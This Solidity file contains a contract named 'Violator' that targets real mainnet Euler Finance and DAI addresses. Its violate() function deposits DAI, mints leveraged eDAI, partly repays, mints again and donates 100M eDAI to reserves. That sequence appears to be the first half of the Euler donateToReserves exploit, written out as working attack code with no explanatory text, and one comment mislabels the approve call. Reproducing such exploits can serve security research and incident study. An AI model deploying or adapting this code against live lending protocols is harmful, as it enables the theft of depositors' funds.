// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IAaveV2} from "src/interfaces/Aave.sol";
import {IEuler} from "src/interfaces/Euler.sol";
import {IERC20} from "src/interfaces/ERC20.sol";
import {IEToken} from "src/interfaces/EToken.sol";
import {IDToken} from "src/interfaces/DToken.sol";

contract Violator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEToken eDAI = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IDToken dDAI = IDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address constant EULER_PROTOCOL = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function violate() external {
        // Deposit 20M DAI into Euler
        DAI.approve(EULER_PROTOCOL, type(uint256).max);
        // Deposit 20M DAI into Euler
        eDAI.deposit(0, 20_000_000e18);
        // Mint 200M eDAI.
        eDAI.mint(0, 200_000_000e18);
        dDAI.repay(0, 10_000_000e18);
        eDAI.mint(0, 200_000_000e18);
        eDAI.donateToReserves(0, 100_000_000e18);
    }
}
